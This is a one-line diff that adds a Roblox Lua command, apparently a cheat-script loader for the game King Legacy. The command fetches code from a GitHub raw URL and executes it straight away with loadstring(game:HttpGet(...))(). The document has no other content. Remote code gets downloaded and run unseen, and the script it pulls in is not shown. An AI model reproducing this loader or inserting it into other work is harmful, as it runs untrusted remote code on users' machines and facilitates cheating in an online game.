@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Geradeleks/gera/refs/heads/main/KingLegacy'))()
